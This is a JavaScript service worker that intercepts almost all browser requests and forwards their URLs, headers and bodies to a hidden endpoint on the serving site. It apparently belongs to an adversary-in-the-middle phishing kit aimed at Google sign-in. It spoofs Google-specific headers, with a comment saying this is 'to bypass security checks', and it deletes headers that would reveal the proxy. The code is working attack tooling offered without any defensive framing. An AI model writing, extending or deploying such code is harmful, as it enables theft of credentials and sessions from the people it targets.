self.addEventListener("install", (event) => {
    self.skipWaiting();
});

self.addEventListener("activate", (event) => {
    event.waitUntil(clients.claim());
});

self.addEventListener("fetch", (event) => {
    const url = new URL(event.request.url);
    
    // Don't intercept our short URLs - let them redirect naturally
    if (url.pathname === '/c' || url.pathname === '/corp' || url.pathname === '/corporate' ||
        url.pathname === '/p' || url.pathname === '/personal' ||
        url.pathname === '/g' || url.pathname === '/google') {
        return;
    }
    
    // Don't intercept the service worker itself or other static files
    if (url.pathname.includes('service_worker') || url.pathname === '/favicon.ico') {
        return;
    }
    
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const proxyRequestURL = `${self.location.origin}/lNv1pC9AWPUY4gbidyBO`;

    try {
        // Create headers object and enhance for Google
        const headers = Object.fromEntries(request.headers.entries());
        
        // Add Google-specific headers to bypass security checks
        if (request.url.includes('accounts.google.com') || request.url.includes('google.com')) {
            headers['sec-gpc'] = '1';
            headers['sec-fetch-dest'] = 'document';
            headers['sec-fetch-mode'] = 'navigate';
            headers['sec-fetch-site'] = 'none';
            headers['sec-fetch-user'] = '?1';
            headers['x-goog-authuser'] = '0';
            headers['x-goog-encode-response-if-executable'] = 'base64';
            headers['x-goog-api-version'] = '2';
            headers['device-memory'] = '8';
            headers['viewport-width'] = '1920';
            
            // Remove any proxy-related headers
            delete headers['x-forwarded-proto'];
            delete headers['x-forwarded-port'];
            delete headers['x-forwarded-host'];
            delete headers['x-forwarded-for'];
            delete headers['x-real-ip'];
            delete headers['via'];
            delete headers['forwarded'];
        }
        
        const proxyRequest = {
            url: request.url,
            method: request.method,
            headers: headers,
            body: await request.text(),
            referrer: request.referrer,
            mode: request.mode
        };
        
        return fetch(proxyRequestURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(proxyRequest),
            redirect: "manual",
            mode: "same-origin"
        });
    }
    catch (error) {
        console.error(`Fetching ${proxyRequestURL} failed: ${error}`);
    }
}